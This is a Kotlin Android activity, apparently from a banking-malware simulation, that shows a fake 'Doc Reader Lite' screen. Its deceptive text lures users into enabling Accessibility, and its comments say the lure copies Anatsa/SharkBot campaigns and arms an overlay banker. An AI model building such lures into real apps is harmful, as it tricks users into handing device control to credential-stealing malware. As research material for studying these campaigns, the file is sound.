package com.docreader.lite

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.graphics.Color
import android.view.Gravity
import android.view.View
import androidx.appcompat.app.AppCompatActivity

/**
 * Social engineering screen — convinces user to enable Accessibility.
 *
 * Real banker lures (from Anatsa/SharkBot campaigns):
 *   - "Enable accessibility to improve document reading experience"
 *   - "Required for text-to-speech and screen reader support"
 *   - "Allow this to hibernate battery-draining apps"
 *
 * This screen mimics the lure pattern. Once user enables → overlay banker armed.
 */
class EnableAccessibilityActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(64, 120, 64, 120)
            setBackgroundColor(Color.WHITE)
        }

        // Icon placeholder (real banker uses app icon or shield icon)
        layout.addView(TextView(this).apply {
            text = "📄" // Document emoji
            textSize = 64f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        })

        layout.addView(TextView(this).apply {
            text = "Enable Document Accessibility"
            textSize = 22f
            setTextColor(Color.parseColor("#1A1A1A"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 24)
        })

        layout.addView(TextView(this).apply {
            text = "To provide the best reading experience, Doc Reader Lite needs " +
                    "accessibility access to read document content aloud and support " +
                    "screen readers.\n\n" +
                    "This also enables:\n" +
                    "• Auto-fill for document forms\n" +
                    "• Smart text selection\n" +
                    "• Battery optimization for background sync"
            textSize = 15f
            setTextColor(Color.parseColor("#444444"))
            gravity = Gravity.START
            setPadding(0, 0, 0, 48)
        })

        val enableBtn = Button(this).apply {
            text = "Enable Now"
            textSize = 16f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#1976D2"))
            setOnClickListener {
                openAccessibilitySettings()
            }
        }
        layout.addView(enableBtn, LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply { bottomMargin = 16 })

        layout.addView(Button(this).apply {
            text = "Skip"
            textSize = 14f
            setTextColor(Color.parseColor("#999999"))
            setBackgroundColor(Color.TRANSPARENT)
            setOnClickListener { finish() }
        })

        setContentView(layout)
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
        // Real banker sometimes auto-navigates using A11y itself after first grant
        // to enable additional permissions without user interaction
        finish()
    }
}
